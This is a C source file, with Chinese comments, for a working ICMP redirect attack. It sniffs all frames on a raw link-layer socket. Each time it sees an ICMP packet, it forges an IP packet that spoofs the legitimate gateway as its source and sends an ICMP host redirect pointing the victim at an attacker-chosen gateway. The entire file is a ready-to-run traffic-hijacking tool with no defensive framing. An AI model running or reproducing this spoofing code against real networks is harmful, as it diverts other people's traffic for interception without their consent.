#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netinet/ip_icmp.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/ether.h>
#include <errno.h>

int sinffer(int sinffer_handler(char* buff,int n,int count))
{

    int BUFFSIZE = 1024;
    int rawsock;
    unsigned char buff[BUFFSIZE];
    int n;
    int count = 0;

    //接受数据链路层数据
    rawsock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL)); // 链路层套接字, 原始套接字, 开启混合模式
    if (rawsock < 0)
    {
        printf("raw socket error!\n");
        exit(1);
    }
    while (1)
    {
        n = recvfrom(rawsock, buff, BUFFSIZE, 0, NULL, NULL);
        if (n < 0)
        {
            printf("receive error!\n");
            exit(1);
        }

        count++;
        sinffer_handler(buff,n,count);
        //sleep(1);
    }
}

int showContent(char* buff,int n,int count){
    struct ip *ip = (struct ip *)(buff);
    // if (ip->ip_p != IPPROTO_ICMP) {
    //     return 0;
    // }
    printf("%4d	%15s      ", count, inet_ntoa(ip->ip_src));
    printf("%15s	%5d	%5d\n", inet_ntoa(ip->ip_dst), ip->ip_p, n);

    int i = 0, j = 0;
    unsigned int t = 0;
    for (i = 0; i < n; i++)
    {
        if (i != 0 && i % 16 == 0)
        {
            printf("	");
            for (j = i - 16; j < i; j++)
            {
                if (buff[j] >= 32 && buff[j] <= 128)
                    printf("%c", buff[j]);
                else
                    printf(".");
            }
            printf("\n");
        }
        if (i % 16 == 0)
            printf("%04x	", i);
        t = (unsigned int)buff[i];
                            // 与0相与消去f
        t &= 0x000000ff;
        printf("%02x", t);

        if (i == n - 1)
        {
            for (j = 0; j < 15 - i % 16; j++)
                printf("  ");
            printf("	");
            for (j = i - i % 16; j <= i; j++)
            {
                if (buff[j] >= 32 && buff[j] < 127)
                    printf("%c", buff[j]);
                else
                    printf(".");
            }
        }
    }
    printf("\n\n");
}

struct sockaddr_in oldGW;
struct sockaddr_in newGW;

unsigned short in_cksum(unsigned short *addr, int len)
{
    int sum = 0;
    unsigned short res = 0;
    while (len > 1)
    {
        sum += *addr++;
        len -= 2;
        // printf("sum is %x.\n",sum);
    }
    if (len == 1)
    {
        *((unsigned char *)(&res)) = *((unsigned char *)addr);
        sum += res;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    res = ~sum;
    return res;
}

#define ICMPREDIRECT_IP_SIZE 56

int sendfd; // 发送数据的描述符
int sendCount = 0;

// 收到ICMP报文就发送一个ICMP重定向
int send_icmp_redirect_ip(char* buff,int n,int count) {
    struct ip *recv_ip = (struct ip *)(buff + 14);
    if (recv_ip->ip_p != IPPROTO_ICMP || recv_ip->ip_dst.s_addr == recv_ip->ip_src.s_addr ) {
        return 0;
    }
    printf("%d , get icmp from %s ",count,inet_ntoa(recv_ip->ip_src));
    printf("to %s\n",inet_ntoa(recv_ip->ip_dst));

    if (recv_ip->ip_src.s_addr == newGW.sin_addr.s_addr) { // 不发送
        return 0;
    }

    char send_buff[ICMPREDIRECT_IP_SIZE] = {0}; // 发送的ip包

    // 设置发送ip头
    struct ip *send_ip = (struct ip *)(send_buff); // 发送的ip包头
    send_ip->ip_src = oldGW.sin_addr; // 伪装旧网关
    send_ip->ip_dst = recv_ip->ip_src;
    send_ip->ip_v = 4;
    send_ip->ip_hl = 5;
    send_ip->ip_len = 56;
    send_ip->ip_off = 0;
    send_ip->ip_tos = 0;
    send_ip->ip_ttl = 64;
    send_ip->ip_p = IPPROTO_ICMP;
    send_ip->ip_id = sendCount;
    sendCount++;
    send_ip->ip_sum = 0;
    send_ip->ip_sum = in_cksum((unsigned short *)send_ip,send_ip->ip_hl);


    // 设置发送的icmp
    struct icmp *send_icmp = (struct icmp *)(send_buff+20); // 发送的icmp重定向包
    send_icmp->icmp_type = ICMP_REDIRECT;
    send_icmp->icmp_code = ICMP_REDIRECT_HOST;
    send_icmp->icmp_hun.ih_gwaddr = newGW.sin_addr; // 设置新网关
    memcpy(send_buff+28,buff+14,28); // 原ip头+8字节数据
    send_icmp->icmp_cksum = 0;
    send_icmp->icmp_cksum = in_cksum((unsigned short *)send_icmp,36);

    showContent(send_buff,ICMPREDIRECT_IP_SIZE,0);
    struct sockaddr_in toaddr= {
        .sin_family = AF_INET,
        .sin_addr = {
            .s_addr = recv_ip->ip_src.s_addr
        }
    };
    if (sendto(sendfd,send_buff,ICMPREDIRECT_IP_SIZE,0,(struct sockaddr*)&toaddr,sizeof(toaddr))<0) {
        exit(0);
    }
}

int main(int argc,char* argv[]) {
    if (argc != 3)
    {
        printf("please input new gateway and old gateway");
        exit(1);
    }

    if (inet_aton(argv[1], &newGW.sin_addr) == 0 ||inet_aton(argv[2], &oldGW.sin_addr) == 0 )
    {
        printf("bad ip address\n");
        exit(1);
    }
    // 发送的文件描述符, IPPROTO_RAW让系统不修改要发的IP数据
    if ((sendfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
        perror("socket error!");
        exit(1);
    }
    sinffer(send_icmp_redirect_ip);
}